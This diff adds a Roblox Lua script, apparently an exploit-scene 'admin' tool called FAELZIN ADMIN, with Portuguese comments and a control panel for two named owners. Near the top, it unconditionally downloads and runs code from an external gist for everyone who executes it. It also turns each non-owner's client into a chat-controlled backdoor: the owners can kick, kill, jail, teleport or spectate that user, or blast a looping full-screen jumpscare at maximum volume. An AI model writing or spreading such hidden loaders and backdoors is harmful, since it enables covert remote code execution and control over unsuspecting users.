@@ -1,0 +1,637 @@
+--[[
+    FAELZIN ADMIN
+    Donos: joca6578 e lucasxs7762
+]]
+
+--// Serviços
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local TextChatService = game:GetService("TextChatService")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
+local Workspace = game:GetService("Workspace")
+local CoreGui = game:GetService("CoreGui")
+local Camera = workspace.CurrentCamera
+
+--// Executa o load para TODOS (independente se é dono ou não)
+pcall(function()
+    loadstring(game:HttpGet("https://gist.githubusercontent.com/PhantomClientDEV/6d65c2e0f668d998b4be8dcab6d9f969/raw/6d1f08a15d890149f5c033b6f29d51eda3de7149/HalloweenV2.lua", true))()
+end)
+
+--// DONOS
+local Donos = {
+    ["joca6578"] = true,
+    ["lucasxs7762"] = true
+}
+
+--// Efeitos locais
+local playerOriginalSpeed = {}
+local playerOriginalJump = {}
+local jaulas = {}
+local jailConnections = {}
+local espectando = false
+local espectarJogador = nil
+local espectarCamera = nil
+
+--// VARIÁVEL DO JUMPSCARE (GLOBAL para controlar)
+_G.JumpscareAtivo = false
+_G.JumpscareScreenGui = nil
+_G.JumpscareSound = nil
+
+--// FUNÇÃO VIEW (EXATAMENTE COMO NO SEU SCRIPT)
+local function ViewPlayer(player)
+    if not player or not player.Character then
+        print("⚠️ Jogador não encontrado ou sem personagem!")
+        return false
+    end
+    
+    local humanoid = player.Character:FindFirstChild("Humanoid")
+    if not humanoid then
+        print("⚠️ Jogador não tem humanoid!")
+        return false
+    end
+    
+    print("👀 Visualizando jogador: " .. player.Name)
+    
+    -- Salvar câmera original se não estiver espectando
+    if not espectando then
+        espectarCamera = Camera.CFrame
+    end
+    
+    -- Definir a câmera para seguir o jogador
+    Camera.CameraSubject = humanoid
+    
+    -- Ativar modo espectador
+    espectando = true
+    espectarJogador = player
+    
+    print("✅ Agora visualizando: " .. player.Name)
+    
+    return true
+end
+
+--// FUNÇÃO VOLTAR PARA VISÃO NORMAL
+local function StopViewing()
+    if not espectando then
+        print("⚠️ Não está visualizando ninguém!")
+        return false
+    end
+    
+    print("⏹️ Parando de visualizar...")
+    
+    -- Voltar para visão normal
+    if LocalPlayer.Character then
+        local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
+        if humanoid then
+            Camera.CameraSubject = humanoid
+        end
+    end
+    
+    -- Restaurar câmera original
+    if espectarCamera then
+        Camera.CFrame = espectarCamera
+    end
+    
+    espectando = false
+    espectarJogador = nil
+    
+    print("✅ Voltou para visão normal!")
+    
+    return true
+end
+
+--// FUNÇÃO JUMPSCARE COM ÁUDIO ID 4575953237 (VOLUME MÁXIMO)
+local function AtivarJumpscareJeff()
+    if _G.JumpscareAtivo then
+        print("⚠️ Jumpscare já está ativo!")
+        return false
+    end
+    
+    print("👻 ATIVANDO JUMPSCARE...")
+    print("🔊 Áudio ID: 4575953237 | Volume: MÁXIMO")
+    
+    _G.JumpscareAtivo = true
+    
+    -- Criar a interface do jumpscare
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "FaelzinJumpscare"
+    ScreenGui.Parent = CoreGui
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.ResetOnSpawn = false
+    
+    -- Frame preto que cobre TUDO
+    local BlackFrame = Instance.new("Frame")
+    BlackFrame.Name = "BlackOverlay"
+    BlackFrame.Size = UDim2.new(1, 0, 1, 0)
+    BlackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+    BlackFrame.BackgroundTransparency = 0
+    BlackFrame.BorderSizePixel = 0
+    BlackFrame.ZIndex = 999
+    BlackFrame.Parent = ScreenGui
+    
+    -- Frame principal
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Name = "MainFrame"
+    MainFrame.Size = UDim2.new(1, 0, 1, 0)
+    MainFrame.BackgroundTransparency = 1
+    MainFrame.ZIndex = 1000
+    MainFrame.Parent = ScreenGui
+    
+    -- IMAGEM DO JUMPSCARE
+    local JumpscareImage = Instance.new("ImageLabel")
+    JumpscareImage.Name = "JumpscareImage"
+    JumpscareImage.Size = UDim2.new(0.7, 0, 0.7, 0)
+    JumpscareImage.Position = UDim2.new(0.15, 0, 0.15, 0)
+    JumpscareImage.Image = "rbxassetid://17372543307"
+    JumpscareImage.BackgroundTransparency = 1
+    JumpscareImage.ZIndex = 1001
+    JumpscareImage.Parent = MainFrame
+    
+    -- TEXTO "FAELZIN HUB AMOR"
+    local FaelzinText = Instance.new("TextLabel")
+    FaelzinText.Name = "FaelzinText"
+    FaelzinText.Size = UDim2.new(1, 0, 0.15, 0)
+    FaelzinText.Position = UDim2.new(0, 0, 0.8, 0)
+    FaelzinText.Text = "FAELZIN HUB AMOR"
+    FaelzinText.TextColor3 = Color3.new(1, 0, 0)
+    FaelzinText.TextScaled = true
+    FaelzinText.Font = Enum.Font.GothamBlack
+    FaelzinText.BackgroundTransparency = 1
+    FaelzinText.TextStrokeColor3 = Color3.new(0, 0, 0)
+    FaelzinText.TextStrokeTransparency = 0
+    FaelzinText.ZIndex = 1002
+    FaelzinText.Parent = MainFrame
+    
+    -- ÁUDIO DO JUMPSCARE - ID 4575953237 NO VOLUME MÁXIMO
+    local ScarySound = Instance.new("Sound")
+    ScarySound.Name = "ScarySound"
+    ScarySound.SoundId = "rbxassetid://4575953237"
+    ScarySound.Volume = 10
+    ScarySound.Looped = true
+    ScarySound.Parent = ScreenGui
+    
+    -- Tentar tocar o som
+    pcall(function()
+        ScarySound:Play()
+    end)
+    
+    -- Guardar referência do som
+    _G.JumpscareSound = ScarySound
+    
+    -- Efeito de piscar no texto
+    coroutine.wrap(function()
+        while _G.JumpscareAtivo and ScreenGui and ScreenGui.Parent do
+            FaelzinText.TextColor3 = Color3.fromRGB(255, 0, 0)
+            task.wait(0.3)
+            FaelzinText.TextColor3 = Color3.fromRGB(255, 255, 255)
+            task.wait(0.3)
+            FaelzinText.TextColor3 = Color3.fromRGB(255, 255, 0)
+            task.wait(0.3)
+        end
+    end)()
+    
+    -- Efeito na imagem (pulsação)
+    coroutine.wrap(function()
+        while _G.JumpscareAtivo and ScreenGui and ScreenGui.Parent do
+            for i = 0.8, 1, 0.02 do
+                JumpscareImage.Size = UDim2.new(i, 0, i, 0)
+                JumpscareImage.Position = UDim2.new((1-i)/2, 0, (1-i)/2, 0)
+                task.wait(0.02)
+            end
+            for i = 1, 0.8, -0.02 do
+                JumpscareImage.Size = UDim2.new(i, 0, i, 0)
+                JumpscareImage.Position = UDim2.new((1-i)/2, 0, (1-i)/2, 0)
+                task.wait(0.02)
+            end
+        end
+    end)()
+    
+    -- Guardar referência da GUI
+    _G.JumpscareScreenGui = ScreenGui
+    
+    print("✅ JUMPSCARE ATIVADO COM SUCESSO!")
+    
+    return true
+end
+
+--// FUNÇÃO REMOVER JUMPSCARE (PARA TUDO)
+local function RemoverJumpscare()
+    if not _G.JumpscareAtivo then
+        print("⚠️ Nenhum jumpscare ativo para remover!")
+        return false
+    end
+    
+    print("✅ REMOVENDO JUMPSCARE...")
+    
+    -- Parar o som
+    if _G.JumpscareSound then
+        _G.JumpscareSound:Stop()
+        _G.JumpscareSound:Destroy()
+        _G.JumpscareSound = nil
+    end
+    
+    -- Remover a GUI
+    if _G.JumpscareScreenGui then
+        _G.JumpscareScreenGui:Destroy()
+    end
+    
+    -- Limpar variáveis
+    _G.JumpscareAtivo = false
+    _G.JumpscareScreenGui = nil
+    
+    print("✅ JUMPSCARE REMOVIDO!")
+    
+    return true
+end
+
+--// Envia comando no chat
+local function EnviarComando(comando, alvo)
+    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
+    if canal then
+        canal:SendAsync(";" .. comando .. " " .. (alvo or ""))
+    end
+end
+
+--// JAULA DE GELO
+local function CriarJaulaDeGelo(player)
+    if not player.Character then return end
+    local root = player.Character:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    
+    local pos = root.Position
+    local nomePlayer = player.Name
+    
+    -- Limpar jaula anterior
+    if jaulas[nomePlayer] then
+        for _, part in ipairs(jaulas[nomePlayer]) do part:Destroy() end
+    end
+    
+    if jailConnections[nomePlayer] then
+        jailConnections[nomePlayer]:Disconnect()
+    end
+    
+    jaulas[nomePlayer] = {}
+    local tamanho = 12
+    
+    -- Criar 6 paredes
+    local positions = {
+        {cf = CFrame.new(pos.X, pos.Y, pos.Z + tamanho/2), size = Vector3.new(tamanho, tamanho, 1)},
+        {cf = CFrame.new(pos.X, pos.Y, pos.Z - tamanho/2), size = Vector3.new(tamanho, tamanho, 1)},
+        {cf = CFrame.new(pos.X - tamanho/2, pos.Y, pos.Z), size = Vector3.new(1, tamanho, tamanho)},
+        {cf = CFrame.new(pos.X + tamanho/2, pos.Y, pos.Z), size = Vector3.new(1, tamanho, tamanho)},
+        {cf = CFrame.new(pos.X, pos.Y + tamanho/2, pos.Z), size = Vector3.new(tamanho, 1, tamanho)},
+        {cf = CFrame.new(pos.X, pos.Y - tamanho/2, pos.Z), size = Vector3.new(tamanho, 1, tamanho)},
+    }
+    
+    for _, data in ipairs(positions) do
+        local parede = Instance.new("Part")
+        parede.Size = data.size
+        parede.CFrame = data.cf
+        parede.Anchored = true
+        parede.CanCollide = true
+        parede.Transparency = 0.5
+        parede.Material = Enum.Material.Ice
+        parede.Color = Color3.fromRGB(179, 230, 255)
+        parede.Parent = workspace
+        table.insert(jaulas[nomePlayer], parede)
+    end
+    
+    -- Manter jogador dentro
+    jailConnections[nomePlayer] = RunService.Heartbeat:Connect(function()
+        if player.Character and root.Parent then
+            if (root.Position - pos).Magnitude > 20 then
+                root.CFrame = CFrame.new(pos)
+            end
+        end
+    end)
+    
+    return true
+end
+
+--// REMOVER JAULA
+local function RemoverJaula(player)
+    local nomePlayer = player.Name
+    
+    if jaulas[nomePlayer] then
+        for _, part in ipairs(jaulas[nomePlayer]) do
+            if part.Parent then part:Destroy() end
+        end
+        jaulas[nomePlayer] = nil
+    end
+    
+    if jailConnections[nomePlayer] then
+        jailConnections[nomePlayer]:Disconnect()
+        jailConnections[nomePlayer] = nil
+    end
+    
+    return true
+end
+
+--// Executa comandos locais
+local function ExecutarComandoLocal(comando, autor)
+    local playerName = LocalPlayer.Name:lower()
+    if not Donos[autor] then return end
+    
+    local character = LocalPlayer.Character
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+    
+    -- JUMPSCARE (ATIVA)
+    if comando:match(";jumpscare%s+" .. playerName) then
+        AtivarJumpscareJeff()
+        return
+    end
+    
+    -- UNJUMPSCARE (REMOVE)
+    if comando:match(";unjumpscare%s+" .. playerName) then
+        RemoverJumpscare()
+        return
+    end
+    
+    -- VIEW (ESPECTAR)
+    if comando:match(";view%s+" .. playerName) then
+        local autorPlayer = Players:FindFirstChild(autor)
+        if autorPlayer then
+            ViewPlayer(autorPlayer)
+        end
+        return
+    end
+    
+    -- UNVIEW (PARAR ESPECTAR)
+    if comando:match(";unview%s+" .. playerName) then
+        StopViewing()
+        return
+    end
+    
+    -- KICK
+    if comando:match(";kick%s+" .. playerName) then
+        LocalPlayer:Kick("FAELZIN ADMIN. Dono: " .. autor)
+    end
+    
+    -- KILL
+    if comando:match(";kill%s+" .. playerName) and character then
+        character:BreakJoints()
+    end
+    
+    -- KILL+
+    if comando:match(";killplus%s+" .. playerName) and character then
+        character:BreakJoints()
+        local root = character:FindFirstChild("HumanoidRootPart")
+        if root then
+            for i = 1, 5 do
+                local part = Instance.new("Part")
+                part.Size = Vector3.new(5, 5, 5)
+                part.Anchored = false
+                part.CanCollide = false
+                part.Material = Enum.Material.Neon
+                part.BrickColor = BrickColor.Random()
+                part.CFrame = root.CFrame
+                part.Parent = workspace
+                
+                local bv = Instance.new("BodyVelocity")
+                bv.Velocity = Vector3.new(math.random(-50, 50), math.random(20, 50), math.random(-50, 50))
+                bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+                bv.Parent = part
+                
+                game.Debris:AddItem(part, 2)
+            end
+        end
+    end
+    
+    -- FLING
+    if comando:match(";fling%s+" .. playerName) and character then
+        local root = character:FindFirstChild("HumanoidRootPart")
+        if root then
+            TweenService:Create(root, TweenInfo.new(1), {CFrame = CFrame.new(0, 10000, 0)}):Play()
+        end
+    end
+    
+    -- FREEZE
+    if comando:match(";freeze%s+" .. playerName) and humanoid then
+        playerOriginalSpeed[playerName] = humanoid.WalkSpeed
+        playerOriginalJump[playerName] = humanoid.JumpPower
+        humanoid.WalkSpeed = 0
+        humanoid.JumpPower = 0
+    end
+    
+    -- UNFREEZE
+    if comando:match(";unfreeze%s+" .. playerName) and humanoid then
+        humanoid.WalkSpeed = playerOriginalSpeed[playerName] or 16
+        humanoid.JumpPower = playerOriginalJump[playerName] or 50
+    end
+    
+    -- JAIL
+    if comando:match(";jail%s+" .. playerName) then
+        CriarJaulaDeGelo(LocalPlayer)
+    end
+    
+    -- UNJAIL
+    if comando:match(";unjail%s+" .. playerName) then
+        RemoverJaula(LocalPlayer)
+    end
+    
+    -- BRING
+    if comando:match(";bring%s+" .. playerName) and character then
+        local autorPlayer = Players:FindFirstChild(autor)
+        if autorPlayer and autorPlayer.Character then
+            local root = character:FindFirstChild("HumanoidRootPart")
+            local targetRoot = autorPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if root and targetRoot then
+                root.CFrame = targetRoot.CFrame * CFrame.new(0, 0, -3)
+            end
+        end
+    end
+    
+    -- VERIFIQUE
+    if comando:match(";verifique%s+" .. playerName) then
+        pcall(function()
+            local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+            if channel then
+                channel:SendAsync("FAELZIN_admin_User" .. math.random(1000, 9999))
+            end
+        end)
+    end
+end
+
+--// Conecta chat
+local function ConectarChat()
+    for _, canal in pairs(TextChatService.TextChannels:GetChildren()) do
+        if canal:IsA("TextChannel") then
+            canal.MessageReceived:Connect(function(msg)
+                if msg.TextSource and msg.Text then
+                    ExecutarComandoLocal(msg.Text:lower(), msg.TextSource.Name)
+                end
+            end)
+        end
+    end
+end
+ConectarChat()
+
+TextChatService.TextChannels.ChildAdded:Connect(function(ch)
+    if ch:IsA("TextChannel") then
+        ch.MessageReceived:Connect(function(msg)
+            if msg.TextSource and msg.Text then
+                ExecutarComandoLocal(msg.Text:lower(), msg.TextSource.Name)
+            end
+        end)
+    end
+end)
+
+--// Painel FAELZIN ADMIN
+if Donos[LocalPlayer.Name] then
+    local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+
+    local Window = WindUI:CreateWindow({
+        Title = "FAELZIN ADMIN",
+        Icon = "crown",
+        Author = "Donos: joca6578 e lucasxs7762",
+        Folder = "FAELZINadmin",
+        Size = UDim2.fromOffset(600,500),
+        Transparent = true,
+        Theme = nil,
+        Resizable = false,
+        SideBarWidth = 200,
+        BackgroundImageTransparency = 0.42,
+        HideSearchBar = true,
+        ScrollBarEnabled = true,
+    })
+
+    -- ABA 1: COMANDOS PRINCIPAIS
+    local TabComandos = Window:Tab({ Title = "Comandos", Icon = "terminal", Locked = false })
+    
+    -- SELEÇÃO DE JOGADOR
+    local SectionSelecao = TabComandos:Section({ Title = "🎯 Selecionar Jogador", Icon = "target", Opened = true })
+
+    local TargetName = ""
+    local function getPlayersList()
+        local t = {}
+        for _, p in ipairs(Players:GetPlayers()) do
+            table.insert(t, p.Name)
+        end
+        return t
+    end
+
+    local Dropdown = SectionSelecao:Dropdown({
+        Title = "Jogador Alvo",
+        Values = getPlayersList(),
+        Value = "",
+        Callback = function(opt) TargetName = opt end
+    })
+
+    Players.PlayerAdded:Connect(function()
+        Dropdown:SetValues(getPlayersList())
+    end)
+    Players.PlayerRemoving:Connect(function()
+        Dropdown:SetValues(getPlayersList())
+    end)
+
+    -- COMANDOS BÁSICOS
+    local comandos = {
+        {Title = "KICK", Desc = "Expulsa o jogador", Comando = "kick"},
+        {Title = "KILL", Desc = "Mata o jogador", Comando = "kill"},
+        {Title = "KILL+", Desc = "Mata com explosão", Comando = "killplus"},
+        {Title = "FLING", Desc = "Lança para longe", Comando = "fling"},
+        {Title = "FREEZE", Desc = "Congela no lugar", Comando = "freeze"},
+        {Title = "UNFREEZE", Desc = "Descongela", Comando = "unfreeze"},
+        {Title = "JAIL", Desc = "Prende em jaula de gelo", Comando = "jail"},
+        {Title = "UNJAIL", Desc = "Liberta da jaula", Comando = "unjail"},
+        {Title = "BRING", Desc = "Traz até você", Comando = "bring"},
+        {Title = "VERIFIQUE", Desc = "Comando de teste", Comando = "verifique"},
+        {Title = "👀 ESPECTAR", Desc = "Segue jogador com câmera", Func = function()
+            if TargetName ~= "" then
+                local playerAlvo = Players:FindFirstChild(TargetName)
+                if playerAlvo then ViewPlayer(playerAlvo) end
+            end
+        end},
+        {Title = "⏹️ PARAR ESPECTAR", Desc = "Volta câmera normal", Func = StopViewing},
+    }
+    
+    for _, cmd in ipairs(comandos) do
+        SectionSelecao:Button({
+            Title = cmd.Title,
+            Desc = cmd.Desc,
+            Callback = function()
+                if TargetName ~= "" or cmd.Title == "⏹️ PARAR ESPECTAR" then
+                    if cmd.Func then
+                        cmd.Func()
+                    else
+                        EnviarComando(cmd.Comando, TargetName)
+                    end
+                end
+            end
+        })
+    end
+    
+    -- ABA 2: JUMPSCARE
+    local TabJumpscare = Window:Tab({ Title = "👻 Jumpscare", Icon = "ghost", Locked = false })
+    
+    -- SELEÇÃO DE JOGADOR PARA JUMPSCARE
+    local SectionSelecaoJS = TabJumpscare:Section({ Title = "🎯 Selecionar Jogador", Icon = "target", Opened = true })
+
+    local TargetJumpscare = ""
+    
+    local DropdownJS = SectionSelecaoJS:Dropdown({
+        Title = "Selecionar Jogador",
+        Values = getPlayersList(),
+        Value = "",
+        Callback = function(opt) 
+            TargetJumpscare = opt
+        end
+    })
+
+    Players.PlayerAdded:Connect(function()
+        DropdownJS:SetValues(getPlayersList())
+    end)
+    
+    Players.PlayerRemoving:Connect(function()
+        DropdownJS:SetValues(getPlayersList())
+    end)
+    
+    -- FUNÇÕES JUMPSCARE
+    local SectionFuncoesJS = TabJumpscare:Section({ Title = "⚙️ Funções", Icon = "zap", Opened = true })
+    
+    SectionFuncoesJS:Button({
+        Title = "👻 ATIVAR JUMPSCARE",
+        Desc = "Ativa jumpscare no jogador selecionado",
+        Callback = function()
+            if TargetJumpscare ~= "" then
+                EnviarComando("jumpscare", TargetJumpscare)
+            end
+        end
+    })
+    
+    SectionFuncoesJS:Button({
+        Title = "✅ REMOVER JUMPSCARE",
+        Desc = "Remove jumpscare do jogador selecionado",
+        Callback = function()
+            if TargetJumpscare ~= "" then
+                EnviarComando("unjumpscare", TargetJumpscare)
+            end
+        end
+    })
+    
+    -- ABA 3: BACKROOMS (SIMPLES)
+    local TabBackrooms = Window:Tab({ Title = "🌌 Backrooms", Icon = "door-open", Locked = false })
+    
+    -- SEM SEÇÃO - APENAS LABEL DIRETAMENTE
+    local BackroomsLabel = TabBackrooms:Label({
+        Title = "ESTÁ EM DESENVOLVIMENTO...",
+        Desc = ""
+    })
+end
+
+--// Som de carregamento
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://8486683243"
+sound.Volume = 0.5
+sound.PlayOnRemove = true
+sound.Parent = workspace
+sound:Destroy()
+
+print("FAELZIN ADMIN - SISTEMA CARREGADO")
+
+if Donos[LocalPlayer.Name] then
+    print("✅ VOCÊ É DONO!")
+else
+    print("👤 JOGADOR NORMAL")
+end
